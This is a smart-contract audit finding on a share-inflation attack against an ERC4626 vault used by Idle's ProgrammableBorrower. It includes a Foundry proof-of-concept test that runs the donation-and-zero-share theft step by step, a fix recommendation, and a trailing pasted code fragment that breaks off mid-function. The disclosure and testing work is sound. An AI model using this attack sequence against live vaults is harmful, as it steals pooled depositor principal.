### Title
Zero-share ERC4626 deposit lets vault depositor steal programmable-borrower principal - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](https://github.com/Noahgrantyt/idle-tranches--010/blob/main/contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary
`ProgrammableBorrower` trusts `vault.deposit()` to return economically meaningful shares and does not enforce a minimum share amount, slippage bound, or post-deposit asset check. An unprivileged user who becomes the first depositor in a configured empty ERC4626 vault can inflate the share price through a donation so the pool’s first deposit mints zero shares, then redeem their share and take the pool principal. [1](#0-0) [2](#0-1) 

### Finding Description
When a programmable epoch starts, `IdleCDOEpochVariant` transfers surplus principal to the configured borrower adapter, and the adapter deposits its full token balance into the configured ERC4626 vault. [3](#0-2) [2](#0-1) 

Before that transaction, an attacker can deposit one wei into an empty ERC4626 vault and then directly donate a large amount of underlying, raising `convertToAssets(1 share)` above the pool deposit size. [4](#0-3) 

The subsequent facility deposit can therefore mint zero shares while transferring the full underlying amount to the vault, because `_depositToVault()` ignores the returned share count. [1](#0-0) 

The donation-isolation guard does not stop this because `_skimDonatedAssets()` only removes raw underlying held directly by the CDO, while this donation is wrapped inside the external vault’s share-price accounting. [5](#0-4) [4](#0-3) 

After redeeming the inflated vault share, `ProgrammableBorrower` retains no vault position and no corresponding cash, even though the CDO still carries minted strategy-token principal. [6](#0-5) 

### Impact Explanation
This breaks the fair-deposit and solvency invariant that transferred pool principal remains represented by recoverable assets. [2](#0-1) 

With a pool deposit of `999_999e6` USDC and an attacker-controlled vault share price slightly above `1_000_000e6` USDC, the pool’s deposit mints zero shares while the attacker’s single share represents the entire vault balance. [1](#0-0) 

The attacker redeems that share and receives approximately `999_999e6` USDC of pool principal as profit, while the facility reports zero vault assets. [6](#0-5) 

When IdleCDO later recalls principal, `onStopEpoch()` cannot source the shortfall because `_currentVaultAssets()` is zero; the subsequent borrower pull fails and IdleCDO enters the borrower-default path. [7](#0-6) [8](#0-7) 

The resulting loss is borne by active tranche holders and defaulted withdrawal receipts through recovery accounting rather than by the attacker. [9](#0-8) 

### Likelihood Explanation
The attack requires the configured ERC4626 vault to be empty or nearly empty before the facility’s first deposit, such as a newly deployed vault selected for a programmable-borrower facility. [10](#0-9) 

No privileged or malicious role is required: the attacker only needs to make the vault’s first deposit and transfer underlying directly to the vault before the first epoch-start deposit. [1](#0-0) 

The attack is not available against a sufficiently liquid vault with enough existing shares or virtual-share protection, so likelihood depends on deployment order and vault selection. [4](#0-3) 

### Recommendation
Require `vault.deposit()` to mint at least a configured minimum share amount and verify that `convertToAssets(shares)` is within an accepted slippage bound of the deposited amount. [1](#0-0) 

Also reject a newly configured vault whose share supply or minimum liquidity is inadequate, or require the vault to have pre-existing protected liquidity before enabling it for programmable-borrower deposits. [10](#0-9) 

### Proof of Concept
The following fork-style Foundry sequence assumes an empty vault using raw-balance asset accounting, a configured `ProgrammableBorrower`, and an initial AA deposit of `999_999e6` USDC.

```solidity
function testVaultShareInflationStealsPoolPrincipal() public {
    uint256 poolDeposit = 999_999e6;
    uint256 donation = 1_000_000e6;

    // Attacker creates the first vault share and raises its asset price.
    deal(asset, attacker, donation + 1);
    vm.startPrank(attacker);
    IERC20(asset).approve(address(vault), 1);
    vault.deposit(1, attacker);
    IERC20(asset).transfer(address(vault), donation);
    vm.stopPrank();

    assertEq(vault.totalSupply(), 1);
    assertGt(vault.convertToAssets(1), poolDeposit);

    // Honest KYC-passed lender funds the pool.
    deal(asset, lender, poolDeposit);
    vm.startPrank(lender);
    IERC20(asset).approve(address(idleCDO), poolDeposit);
    idleCDO.depositAA(poolDeposit);
    vm.stopPrank();

    // Honest manager starts the epoch. IdleCDO sends principal to
    // ProgrammableBorrower, which deposits it into the inflated vault.
    vm.prank(manager);
    idleCDO.startEpoch();

    // Rounding minted zero shares for the full pool deposit.
    assertEq(vault.balanceOf(address(programmableBorrower)), 0);
    assertEq(programmableBorrower.totalUnderlying(), 0);

    // The attacker redeems the sole share and takes all vault assets.
    vm.prank(attacker);
    vault.redeem(1, attacker, attacker);

    assertGe(IERC20(asset).balanceOf(attacker), donation + poolDeposit);

    // A later close-pool stop cannot source principal and enters default.
    vm.warp(idleCDO.epochEndDate() + 1);
    vm.prank(manager);
    idleCDO.stopEpoch(0, 1);
    assertTrue(idleCDO.defaulted());
}
```

  function finalizeDefaultRecovery(uint256 _recoveredAmount, address _recoverySource) external returns (uint256 defaultBBNav) {
    _onlyIdleCDO();
    _ensureDefaultRecoveryInitialized();

    IIdleCDOEpochVariant cdo = IIdleCDOEpochVariant(idleCDO);
    if (defaultRecoveryFinalized || !cdo.defaulted()) revert NotAllowed();
    if (_recoveredAmount != 0 && _recoverySource == address(0)) revert NotAllowed();

    // Active holders are still represented by strategy tokens owned by the CDO. Add the
    // default-epoch net interest so they use the same claim basis as pending redeemers.
    // Split gross backing by saved NAV and default interest by the configured APR split.
    // The CDO strategy-token balance is its gross active value before `unclaimedFees`.
    // Using it directly restores those waived unpaid fees to active recovery basis.
    uint256 activeBalance = balanceOf(idleCDO);
    uint256 activeInterest = _defaultActiveInterestBasis(cdo);
    uint256 activeBasis = activeBalance + activeInterest;
    defaultBBNav = _defaultBBBasis(cdo, activeBalance, activeInterest);
    // Pending receipts have already left active CDO NAV, so they are added as a separate basis.
    uint256 pendingBasis = defaultPendingClaimBasis();
    uint256 totalBasis = activeBasis + pendingBasis;
    if (totalBasis == 0) revert NotAllowed();

    // Some recovery funds may already be in this strategy: partially prefunded instant requests
    // and borrower-send funds that failed at epoch start. Count both without pulling them again.
    uint256 prefundedReserve = _defaultPrefundedInstantReserve();
    uint256 reserveAmount = _recoveredAmount + prefundedReserve + defaultRecoveryReserve;
    // Recovery can be above par if the recovered funds exceed the computed basis.
    uint256 recoveryPrice = reserveAmount * RECOVERY_FULL / totalBasis;

    defaultRecoveryFinalized = true;
    defaultRecoveryReserve = reserveAmount;
    defaultRecoveryPrice = recoveryPrice;
    defaultRecoveryEpoch = epochNumber;
    // A non-zero pending instant bucket means current-epoch instant receipts were not fully funded
    // and must be paid through the same recovery ratio as normal pending receipts.
    defaultInstantWithdrawsFinalized = pendingInstantWithdraws != 0;

    // _forceUpdateAccounting so tranche prices/virtualPrice expose the crystallized loss.
    uint256 activeFinalNAV = (activeBasis * recoveryPrice) / RECOVERY_FULL;
    defaultBBNav = defaultBBNav * recoveryPrice / RECOVERY_FULL;
    if (activeBalance > activeFinalNAV) {
      _burn(idleCDO, activeBalance - activeFinalNAV);
